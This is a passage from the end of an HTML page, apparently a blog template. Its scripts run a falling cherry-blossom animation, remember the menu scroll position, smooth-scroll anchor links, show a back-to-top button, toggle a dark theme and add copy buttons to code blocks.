        leaf.style.background = 'linear-gradient(to bottom right, #ffc0cb, #ffb6c1)';
        leaf.style.borderRadius = '10px 0'; 
        leaf.style.opacity = Math.random() * 0.5 + 0.3;
        leaf.style.top = '-20px';
        leaf.style.left = Math.random() * 100 + '%';
        
        
        var duration = Math.random() * 5 + 5 + 's'; 
        var delay = Math.random() * 5 + 's';
        
        leaf.style.transition = `top ${duration} linear, transform ${duration} ease-in-out, opacity ${duration}`;
        container.appendChild(leaf);

        
        setTimeout(function() {
            leaf.style.top = '110%'; 
            leaf.style.transform = `rotate(${Math.random() * 360}deg) translateX(${Math.random() * 100 - 50}px)`;
            leaf.style.opacity = '0';
        }, 100);

        
        setTimeout(function() {
            leaf.remove();
        }, parseFloat(duration) * 1000 + 1000);
    }

    
    var interval = setInterval(function() {
        if (document.getElementById('sakura-container')) {
            createLeaf();
        }
    }, 400); 

    
    setTimeout(function() {
        clearInterval(interval); 
        
        
        setTimeout(function() {
            if(container) container.remove();
            console.log("樱花已落尽。");
        }, 10000); 
        
    }, STOP_TIME);

})();
</script>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
